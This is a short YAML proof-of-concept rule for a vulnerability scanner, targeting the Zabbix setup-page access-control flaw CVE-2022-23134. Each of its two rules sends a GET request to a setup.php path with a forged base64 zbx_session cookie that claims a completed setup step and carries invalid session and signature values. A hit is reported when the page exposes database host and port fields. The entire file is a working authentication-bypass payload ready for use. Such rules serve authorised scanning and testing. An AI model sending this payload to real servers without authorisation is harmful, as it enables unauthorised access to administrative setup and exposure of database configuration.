name: poc-yaml-zabbix-cve-2022-23134
binding: 985ddfa3-0379-4a06-9c18-7065830d6d10
manual: true
detail:
    author: xiaobaicai
    links:
        - http://cn-sec.com/archives/854192.html
    vulnerability:
        id: CT-292707
        level: medium
transport: http
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /zabbix/setup.php
            headers:
                cookie: zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D
        expression: response.status == 200 && response.body.bcontains(b"Database") && response.body.bcontains(b"host") && response.body.bcontains(b"port") && response.body.bcontains(b"Zabbix")
    r2:
        request:
            cache: true
            method: GET
            path: /setup.php
            headers:
                cookie: zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D
        expression: response.status == 200 && response.body.bcontains(b"Database") && response.body.bcontains(b"host") && response.body.bcontains(b"port") && response.body.bcontains(b"Zabbix")
expression: r1() || r2()
